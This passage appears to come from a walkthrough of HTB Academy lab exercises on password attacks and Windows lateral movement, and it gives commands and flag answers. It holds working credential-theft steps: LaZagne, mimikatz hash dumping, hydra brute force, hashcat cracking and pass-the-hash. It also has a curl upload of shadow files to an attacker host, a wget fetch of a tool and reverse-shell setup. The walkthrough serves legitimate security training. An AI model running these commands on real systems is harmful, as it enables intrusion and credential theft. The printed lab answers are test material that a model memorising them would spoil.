<p><strong>RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-169-1">1</a></span>
<span class="normal"><a href="#__codelineno-169-2">2</a></span>
<span class="normal"><a href="#__codelineno-169-3">3</a></span>
<span class="normal"><a href="#__codelineno-169-4">4</a></span>
<span class="normal"><a href="#__codelineno-169-5">5</a></span>
<span class="normal"><a href="#__codelineno-169-6">6</a></span>
<span class="normal"><a href="#__codelineno-169-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-169-1"><a id="__codelineno-169-1" name="__codelineno-169-1"></a><span class="c1"># Copy lazagne to the windows machine. For instance, to Bob&#39;s Desktop and run it</span>
</span><span id="__span-169-2"><a id="__codelineno-169-2" name="__codelineno-169-2"></a>start<span class="w"> </span>.<span class="se">\l</span>azagne.exe<span class="w"> </span>all
</span><span id="__span-169-3"><a id="__codelineno-169-3" name="__codelineno-169-3"></a><span class="c1"># [+] Password found !!!</span>
</span><span id="__span-169-4"><a id="__codelineno-169-4" name="__codelineno-169-4"></a><span class="c1"># URL: 10.129.202.64</span>
</span><span id="__span-169-5"><a id="__codelineno-169-5" name="__codelineno-169-5"></a><span class="c1"># Login: ubuntu</span>
</span><span id="__span-169-6"><a id="__codelineno-169-6" name="__codelineno-169-6"></a><span class="c1"># Password: FSadmin123</span>
</span><span id="__span-169-7"><a id="__codelineno-169-7" name="__codelineno-169-7"></a><span class="c1"># Port: 22     </span>
</span></code></pre></div></td></tr></table></div>
<p>Results: ubuntu:FSadmin123</p>
<p><strong>RDP to  with user "Bob" and password "HTB_@cademy_stdnt!".  What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-170-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-170-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-170-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-170-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-170-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-170-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-170-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-170-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-170-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-170-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-170-1"><a id="__codelineno-170-1" name="__codelineno-170-1"></a><span class="c1"># Alternative 1:</span>
</span><span id="__span-170-2"><a id="__codelineno-170-2" name="__codelineno-170-2"></a>Get-ChildItem<span class="w"> </span>-Path<span class="w"> </span>C:<span class="se">\ </span>-Recurse<span class="w"> </span>-ErrorAction<span class="w"> </span>SilentlyContinue<span class="w"> </span><span class="p">|</span><span class="w"> </span>Select-String<span class="w"> </span>-Pattern<span class="w"> </span><span class="s2">&quot;password|pwd|pass&quot;</span>
</span><span id="__span-170-3"><a id="__codelineno-170-3" name="__codelineno-170-3"></a>
</span><span id="__span-170-4"><a id="__codelineno-170-4" name="__codelineno-170-4"></a><span class="c1"># Alternative 2:</span>
</span><span id="__span-170-5"><a id="__codelineno-170-5" name="__codelineno-170-5"></a><span class="w"> </span>Querying<span class="w"> </span>patterns<span class="w"> </span>of<span class="w"> </span>files<span class="w"> </span>with<span class="w"> </span>findstr
</span><span id="__span-170-6"><a id="__codelineno-170-6" name="__codelineno-170-6"></a>findstr<span class="w"> </span>/SIM<span class="w"> </span>/C:<span class="s2">&quot;password&quot;</span><span class="w"> </span>*.txt<span class="w"> </span>*.ini<span class="w"> </span>*.cfg<span class="w"> </span>*.config<span class="w"> </span>*.xml<span class="w"> </span>*.git<span class="w"> </span>*.ps1<span class="w"> </span>*.yml
</span><span id="__span-170-7"><a id="__codelineno-170-7" name="__codelineno-170-7"></a>
</span><span id="__span-170-8"><a id="__codelineno-170-8" name="__codelineno-170-8"></a><span class="c1"># The first result we obtain is c:\Automations&amp;Scripts\BulkaddADusers.ps1</span>
</span><span id="__span-170-9"><a id="__codelineno-170-9" name="__codelineno-170-9"></a><span class="nb">type</span><span class="w"> </span><span class="s1">&#39;C:\Automations&amp;Scripts\BulkaddADusers.ps1&#39;</span>
</span><span id="__span-170-10"><a id="__codelineno-170-10" name="__codelineno-170-10"></a><span class="c1"># And we check that the default password is set to Inlanefreightisgreat2022</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: Inlanefreightisgreat2022</p>
<p><strong>RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-171-1">1</a></span>
<span class="normal"><a href="#__codelineno-171-2">2</a></span>
<span class="normal"><a href="#__codelineno-171-3">3</a></span>
<span class="normal"><a href="#__codelineno-171-4">4</a></span>
<span class="normal"><a href="#__codelineno-171-5">5</a></span>
<span class="normal"><a href="#__codelineno-171-6">6</a></span>
<span class="normal"><a href="#__codelineno-171-7">7</a></span>
<span class="normal"><a href="#__codelineno-171-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-171-1"><a id="__codelineno-171-1" name="__codelineno-171-1"></a># We search the string Edge-Router
</span><span id="__span-171-2"><a id="__codelineno-171-2" name="__codelineno-171-2"></a>Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern &quot;Edge-Router&quot;
</span><span id="__span-171-3"><a id="__codelineno-171-3" name="__codelineno-171-3"></a>
</span><span id="__span-171-4"><a id="__codelineno-171-4" name="__codelineno-171-4"></a># We obtain as results:
</span><span id="__span-171-5"><a id="__codelineno-171-5" name="__codelineno-171-5"></a>Automations&amp;Scripts\AnsibleScripts\EdgeRouterConfigs
</span><span id="__span-171-6"><a id="__codelineno-171-6" name="__codelineno-171-6"></a>
</span><span id="__span-171-7"><a id="__codelineno-171-7" name="__codelineno-171-7"></a># We open that file and retrieve username and password
</span><span id="__span-171-8"><a id="__codelineno-171-8" name="__codelineno-171-8"></a>edgeadmin:Edge@dmin123!
</span></code></pre></div></td></tr></table></div>
<p>Results: edgeadmin:Edge@dmin123!</p>
<h3 id="linux-local-password-attacks">Linux Local Password Attacks</h3>
<p><strong>Examine the target and find out the password of the user Will. Then, submit the password as the answer.</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-172-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-172-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-172-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-172-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-172-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-172-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-172-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-172-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-172-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-172-10">10</a></span>
<span class="normal"><a href="#__codelineno-172-11">11</a></span>
<span class="normal"><a href="#__codelineno-172-12">12</a></span>
<span class="normal"><a href="#__codelineno-172-13">13</a></span>
<span class="normal"><a href="#__codelineno-172-14">14</a></span>
<span class="normal"><a href="#__codelineno-172-15">15</a></span>
<span class="normal"><a href="#__codelineno-172-16">16</a></span>
<span class="normal"><a href="#__codelineno-172-17">17</a></span>
<span class="normal"><a href="#__codelineno-172-18">18</a></span>
<span class="normal"><a href="#__codelineno-172-19">19</a></span>
<span class="normal"><a href="#__codelineno-172-20">20</a></span>
<span class="normal"><a href="#__codelineno-172-21">21</a></span>
<span class="normal"><a href="#__codelineno-172-22">22</a></span>
<span class="normal"><a href="#__codelineno-172-23">23</a></span>
<span class="normal"><a href="#__codelineno-172-24">24</a></span>
<span class="normal"><a href="#__codelineno-172-25">25</a></span>
<span class="normal"><a href="#__codelineno-172-26">26</a></span>
<span class="normal"><a href="#__codelineno-172-27">27</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-172-1"><a id="__codelineno-172-1" name="__codelineno-172-1"></a><span class="c1"># Enumerate services</span>
</span><span id="__span-172-2"><a id="__codelineno-172-2" name="__codelineno-172-2"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>~ip<span class="w"> </span>-Pn
</span><span id="__span-172-3"><a id="__codelineno-172-3" name="__codelineno-172-3"></a><span class="c1"># We obtain open services: ftp, ssh and smb</span>
</span><span id="__span-172-4"><a id="__codelineno-172-4" name="__codelineno-172-4"></a>
</span><span id="__span-172-5"><a id="__codelineno-172-5" name="__codelineno-172-5"></a><span class="c1"># The hint offers us the creds: Kira:LoveYou1. However they do not work on the existing services. We need to mutate a little the password list provided by HTB in resources.</span>
</span><span id="__span-172-6"><a id="__codelineno-172-6" name="__codelineno-172-6"></a><span class="nb">echo</span><span class="w"> </span>LoveYou1<span class="w"> </span>&gt;<span class="w"> </span>originalpass.txt
</span><span id="__span-172-7"><a id="__codelineno-172-7" name="__codelineno-172-7"></a>hashcat<span class="w"> </span>--force<span class="w"> </span>originalpass.txt<span class="w"> </span>-r<span class="w"> </span>custom.rule<span class="w"> </span>--stdout<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span>&gt;<span class="w"> </span>mutatedlist.list
</span><span id="__span-172-8"><a id="__codelineno-172-8" name="__codelineno-172-8"></a>
</span><span id="__span-172-9"><a id="__codelineno-172-9" name="__codelineno-172-9"></a><span class="c1"># Now we launch our attack:</span>
</span><span id="__span-172-10"><a id="__codelineno-172-10" name="__codelineno-172-10"></a>hydra<span class="w"> </span>-l<span class="w"> </span>kira<span class="w"> </span>-P<span class="w"> </span>mutatedlist.list<span class="w"> </span>ssh://<span class="nv">$ip</span>
</span><span id="__span-172-11"><a id="__codelineno-172-11" name="__codelineno-172-11"></a><span class="c1"># Results: [22][ssh] host: 10.129.229.2   login: kira   password: L0vey0u1!</span>
</span><span id="__span-172-12"><a id="__codelineno-172-12" name="__codelineno-172-12"></a>
</span><span id="__span-172-13"><a id="__codelineno-172-13" name="__codelineno-172-13"></a>ssh<span class="w"> </span>kira@<span class="nv">$ip</span>
</span><span id="__span-172-14"><a id="__codelineno-172-14" name="__codelineno-172-14"></a><span class="c1"># Enter the password: L0vey0u1!</span>
</span><span id="__span-172-15"><a id="__codelineno-172-15" name="__codelineno-172-15"></a>
</span><span id="__span-172-16"><a id="__codelineno-172-16" name="__codelineno-172-16"></a><span class="c1"># Serve the  firefox_decrypt.py from your kali</span>
</span><span id="__span-172-17"><a id="__codelineno-172-17" name="__codelineno-172-17"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8001</span>
</span><span id="__span-172-18"><a id="__codelineno-172-18" name="__codelineno-172-18"></a>
</span><span id="__span-172-19"><a id="__codelineno-172-19" name="__codelineno-172-19"></a><span class="c1"># Download it into the target machine</span>
</span><span id="__span-172-20"><a id="__codelineno-172-20" name="__codelineno-172-20"></a>wget<span class="w"> </span>http://<span class="nv">$IPAtacker</span>:8001/firefox_decrypt.py
</span><span id="__span-172-21"><a id="__codelineno-172-21" name="__codelineno-172-21"></a>
</span><span id="__span-172-22"><a id="__codelineno-172-22" name="__codelineno-172-22"></a><span class="c1"># Now run it:</span>
</span><span id="__span-172-23"><a id="__codelineno-172-23" name="__codelineno-172-23"></a>python3.9<span class="w"> </span>firefox_decrypt.py
</span><span id="__span-172-24"><a id="__codelineno-172-24" name="__codelineno-172-24"></a><span class="c1"># Results:</span>
</span><span id="__span-172-25"><a id="__codelineno-172-25" name="__codelineno-172-25"></a><span class="c1"># Website:   https://dev.inlanefreight.com</span>
</span><span id="__span-172-26"><a id="__codelineno-172-26" name="__codelineno-172-26"></a><span class="c1"># Username: &#39;will@inlanefreight.htb&#39;</span>
</span><span id="__span-172-27"><a id="__codelineno-172-27" name="__codelineno-172-27"></a><span class="c1"># Password: &#39;TUqr7QfLTLhruhVbCP&#39;</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: TUqr7QfLTLhruhVbCP</p>
<p><strong>Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-173-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-173-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-173-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-173-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-173-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-173-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-173-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-173-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-173-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-173-10">10</a></span>
<span class="normal"><a href="#__codelineno-173-11">11</a></span>
<span class="normal"><a href="#__codelineno-173-12">12</a></span>
<span class="normal"><a href="#__codelineno-173-13">13</a></span>
<span class="normal"><a href="#__codelineno-173-14">14</a></span>
<span class="normal"><a href="#__codelineno-173-15">15</a></span>
<span class="normal"><a href="#__codelineno-173-16">16</a></span>
<span class="normal"><a href="#__codelineno-173-17">17</a></span>
<span class="normal"><a href="#__codelineno-173-18">18</a></span>
<span class="normal"><a href="#__codelineno-173-19">19</a></span>
<span class="normal"><a href="#__codelineno-173-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-173-1"><a id="__codelineno-173-1" name="__codelineno-173-1"></a># After browsing the file system we notice files passwd.bak and shadow.bak under /home/will/.backups/. We will try to unshadow those files, but for that we need to transfer them to our attacker machine. 
</span><span id="__span-173-2"><a id="__codelineno-173-2" name="__codelineno-173-2"></a>
</span><span id="__span-173-3"><a id="__codelineno-173-3" name="__codelineno-173-3"></a># We will use uploadserver. In our attacker machine, as we will use https, we will create a self-signed certificate.
</span><span id="__span-173-4"><a id="__codelineno-173-4" name="__codelineno-173-4"></a>openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj &#39;/CN=server&#39;
</span><span id="__span-173-5"><a id="__codelineno-173-5" name="__codelineno-173-5"></a>
</span><span id="__span-173-6"><a id="__codelineno-173-6" name="__codelineno-173-6"></a>#  The webserver should not host the certificate. We create a new directory to host the file for our webserver.
</span><span id="__span-173-7"><a id="__codelineno-173-7" name="__codelineno-173-7"></a>mkdir https &amp;&amp; cd https
</span><span id="__span-173-8"><a id="__codelineno-173-8" name="__codelineno-173-8"></a>
</span><span id="__span-173-9"><a id="__codelineno-173-9" name="__codelineno-173-9"></a># We start the web server in out attacker machine
</span><span id="__span-173-10"><a id="__codelineno-173-10" name="__codelineno-173-10"></a>python3 -m uploadserver 443 --server-certificate ~/borrar/server.pem
</span><span id="__span-173-11"><a id="__codelineno-173-11" name="__codelineno-173-11"></a>
</span><span id="__span-173-12"><a id="__codelineno-173-12" name="__codelineno-173-12"></a># Now from our compromised machine, let&#39;s upload the   `passwd.bak` and `shadow.bak`  files.
</span><span id="__span-173-13"><a id="__codelineno-173-13" name="__codelineno-173-13"></a>curl -X POST http://$ipAttackerMachine/upload -F &#39;files=@/home/will/.backups/passwd.bak&#39; -F &#39;files=@/home/will/.backups/shadow.bak&#39; --insecure
</span><span id="__span-173-14"><a id="__codelineno-173-14" name="__codelineno-173-14"></a># We used the option --insecure because we used a self-signed certificate that we trust.
</span><span id="__span-173-15"><a id="__codelineno-173-15" name="__codelineno-173-15"></a>
</span><span id="__span-173-16"><a id="__codelineno-173-16" name="__codelineno-173-16"></a># Now we unshadow those files:
</span><span id="__span-173-17"><a id="__codelineno-173-17" name="__codelineno-173-17"></a>unshadow passwd.bak shadow.bak &gt; unshadowed.hashes
</span><span id="__span-173-18"><a id="__codelineno-173-18" name="__codelineno-173-18"></a>
</span><span id="__span-173-19"><a id="__codelineno-173-19" name="__codelineno-173-19"></a># And crack them:
</span><span id="__span-173-20"><a id="__codelineno-173-20" name="__codelineno-173-20"></a>hashcat -m 1800 -a 3 unshadowed.hashes /usr/share/wordlists/rockyou.txt -o unshadowed.cracked
</span></code></pre></div></td></tr></table></div>
<p>Results: J0rd@n5</p>
<h3 id="windows-lateral-movement">Windows Lateral Movement</h3>
<p><strong>Authenticate to  with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453". Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-174-1">1</a></span>
<span class="normal"><a href="#__codelineno-174-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-174-1"><a id="__codelineno-174-1" name="__codelineno-174-1"></a><span class="n">xfreerdp</span> <span class="p">/</span><span class="n">u</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">pth</span><span class="p">:</span><span class="n">30B3783CE2ABF1AF70F77D0660CF3453</span> <span class="p">/</span><span class="n">v</span><span class="p">:</span><span class="nv">$ip</span>
</span><span id="__span-174-2"><a id="__codelineno-174-2" name="__codelineno-174-2"></a><span class="n">impacket-psexec</span> <span class="n">Administrator</span><span class="p">@</span><span class="nv">$ip</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">30B3783CE2ABF1AF70F77D0660CF3453</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>G3t_4CCE$$_V1@_PTH</code></p>
<p><strong>Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-175-1">1</a></span>
<span class="normal"><a href="#__codelineno-175-2">2</a></span>
<span class="normal"><a href="#__codelineno-175-3">3</a></span>
<span class="normal"><a href="#__codelineno-175-4">4</a></span>
<span class="normal"><a href="#__codelineno-175-5">5</a></span>
<span class="normal"><a href="#__codelineno-175-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-175-1"><a id="__codelineno-175-1" name="__codelineno-175-1"></a><span class="c"># When trying to access with</span>
</span><span id="__span-175-2"><a id="__codelineno-175-2" name="__codelineno-175-2"></a><span class="n">xfreerdp</span> <span class="p">/</span><span class="n">u</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">pth</span><span class="p">:</span><span class="n">30B3783CE2ABF1AF70F77D0660CF3453</span> <span class="p">/</span><span class="n">v</span><span class="p">:</span><span class="nv">$ip</span>
</span><span id="__span-175-3"><a id="__codelineno-175-3" name="__codelineno-175-3"></a><span class="c"># we obtained an error message as it was in Restricted Admin Mode. In the connection we already have we change the registry</span>
</span><span id="__span-175-4"><a id="__codelineno-175-4" name="__codelineno-175-4"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x0</span> <span class="p">/</span><span class="n">f</span>
</span><span id="__span-175-5"><a id="__codelineno-175-5" name="__codelineno-175-5"></a>
</span><span id="__span-175-6"><a id="__codelineno-175-6" name="__codelineno-175-6"></a><span class="c"># And now we can access viar RDP</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: DisableRestrictedAdmin</p>
<p><strong>RDP to with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453". Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-176-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-176-1"><a id="__codelineno-176-1" name="__codelineno-176-1"></a> <span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="n">exit</span>  
</span></code></pre></div></td></tr></table></div>
<p>Results: c39f2beb3d2ec06a62cb887fb391dee0</p>
<p><strong>Using David's hash, perform a Pass the Hash attack to connect to the shared folder \DC01\david and read the file david.txt.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-177-1">1</a></span>
<span class="normal"><a href="#__codelineno-177-2">2</a></span>
<span class="normal"><a href="#__codelineno-177-3">3</a></span>
<span class="normal"><a href="#__codelineno-177-4">4</a></span>
<span class="normal"><a href="#__codelineno-177-5">5</a></span>
<span class="normal"><a href="#__codelineno-177-6">6</a></span>
<span class="normal"><a href="#__codelineno-177-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-177-1"><a id="__codelineno-177-1" name="__codelineno-177-1"></a><span class="c"># Alternative #1: mimikatz</span>
</span><span id="__span-177-2"><a id="__codelineno-177-2" name="__codelineno-177-2"></a><span class="c"># From the RDP connection we have, from powershell terminal:</span>
</span><span id="__span-177-3"><a id="__codelineno-177-3" name="__codelineno-177-3"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;sekurlsa::pth /user:david /NTLM:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe&quot;</span> <span class="n">exit</span>     
</span><span id="__span-177-4"><a id="__codelineno-177-4" name="__codelineno-177-4"></a>
</span><span id="__span-177-5"><a id="__codelineno-177-5" name="__codelineno-177-5"></a><span class="c"># A terminal cmd.exe opens. Run</span>
</span><span id="__span-177-6"><a id="__codelineno-177-6" name="__codelineno-177-6"></a><span class="nb">dir </span><span class="p">\\</span><span class="n">DC01</span><span class="p">\</span><span class="n">david</span>
</span><span id="__span-177-7"><a id="__codelineno-177-7" name="__codelineno-177-7"></a><span class="nb">type </span><span class="p">\\</span><span class="n">DC01</span><span class="p">\</span><span class="n">david</span><span class="p">\</span><span class="n">david</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: D3V1d_Fl5g_is_Her3</p>
<p><strong>Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \DC01\julio and read the file julio.txt.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-178-1">1</a></span>
<span class="normal"><a href="#__codelineno-178-2">2</a></span>
<span class="normal"><a href="#__codelineno-178-3">3</a></span>
<span class="normal"><a href="#__codelineno-178-4">4</a></span>
<span class="normal"><a href="#__codelineno-178-5">5</a></span>
<span class="normal"><a href="#__codelineno-178-6">6</a></span>
<span class="normal"><a href="#__codelineno-178-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-178-1"><a id="__codelineno-178-1" name="__codelineno-178-1"></a><span class="c"># Alternative #1: mimikatz</span>
</span><span id="__span-178-2"><a id="__codelineno-178-2" name="__codelineno-178-2"></a><span class="c"># From the RDP connection we have, from powershell terminal:</span>
</span><span id="__span-178-3"><a id="__codelineno-178-3" name="__codelineno-178-3"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe&quot;</span> <span class="n">exit</span>  
</span><span id="__span-178-4"><a id="__codelineno-178-4" name="__codelineno-178-4"></a>
</span><span id="__span-178-5"><a id="__codelineno-178-5" name="__codelineno-178-5"></a><span class="c"># A terminal cmd.exe opens. Run</span>
</span><span id="__span-178-6"><a id="__codelineno-178-6" name="__codelineno-178-6"></a><span class="nb">dir </span><span class="p">\\</span><span class="n">DC01</span><span class="p">\</span><span class="n">julio</span>
</span><span id="__span-178-7"><a id="__codelineno-178-7" name="__codelineno-178-7"></a><span class="nb">type </span><span class="p">\\</span><span class="n">DC01</span><span class="p">\</span><span class="n">julio</span><span class="p">\</span><span class="n">julio</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: JuL1()_SH@re_fl@g</p>
<p><strong>Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-179-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-179-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-179-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-179-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-179-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-179-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-179-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-179-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-179-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-179-10">10</a></span>
<span class="normal"><a href="#__codelineno-179-11">11</a></span>
<span class="normal"><a href="#__codelineno-179-12">12</a></span>
<span class="normal"><a href="#__codelineno-179-13">13</a></span>
<span class="normal"><a href="#__codelineno-179-14">14</a></span>
<span class="normal"><a href="#__codelineno-179-15">15</a></span>
<span class="normal"><a href="#__codelineno-179-16">16</a></span>
<span class="normal"><a href="#__codelineno-179-17">17</a></span>
<span class="normal"><a href="#__codelineno-179-18">18</a></span>
<span class="normal"><a href="#__codelineno-179-19">19</a></span>
<span class="normal"><a href="#__codelineno-179-20">20</a></span>
<span class="normal"><a href="#__codelineno-179-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-179-1"><a id="__codelineno-179-1" name="__codelineno-179-1"></a><span class="c"># We wnumerate the possible IPs for DC fron our RDP connection</span>
</span><span id="__span-179-2"><a id="__codelineno-179-2" name="__codelineno-179-2"></a><span class="n">1</span><span class="p">..</span><span class="n">254</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="s2">&quot;172.16.5.</span><span class="p">$(</span><span class="nv">$_</span><span class="p">)</span><span class="s2">: </span><span class="p">$(</span><span class="nb">Test-Connection</span> <span class="n">-count</span> <span class="n">1</span> <span class="n">-comp</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">5</span><span class="p">.$(</span><span class="nv">$_</span><span class="p">)</span> <span class="n">-quiet</span><span class="p">)</span><span class="s2">&quot;</span><span class="p">}</span>
</span><span id="__span-179-3"><a id="__codelineno-179-3" name="__codelineno-179-3"></a><span class="c"># It might be 172.16.1.10</span>
</span><span id="__span-179-4"><a id="__codelineno-179-4" name="__codelineno-179-4"></a>
</span><span id="__span-179-5"><a id="__codelineno-179-5" name="__codelineno-179-5"></a><span class="c"># In the running RDP connection we have we will open a powershell terminal as julio, by using mimikatz and a passthehash</span>
</span><span id="__span-179-6"><a id="__codelineno-179-6" name="__codelineno-179-6"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:powershell.exe&quot;</span> <span class="n">exit</span>  
</span><span id="__span-179-7"><a id="__codelineno-179-7" name="__codelineno-179-7"></a>
</span><span id="__span-179-8"><a id="__codelineno-179-8" name="__codelineno-179-8"></a><span class="c"># We will do the same to have a cmd.exe running as julio</span>
</span><span id="__span-179-9"><a id="__codelineno-179-9" name="__codelineno-179-9"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe&quot;</span> <span class="n">exit</span>  
</span><span id="__span-179-10"><a id="__codelineno-179-10" name="__codelineno-179-10"></a>
</span><span id="__span-179-11"><a id="__codelineno-179-11" name="__codelineno-179-11"></a><span class="c"># In the cmd.exe we will browse to tools and set a netcat listener on port 1234</span>
</span><span id="__span-179-12"><a id="__codelineno-179-12" name="__codelineno-179-12"></a>
</span><span id="__span-179-13"><a id="__codelineno-179-13" name="__codelineno-179-13"></a><span class="c"># In the powershell terminal, browse to tools</span>
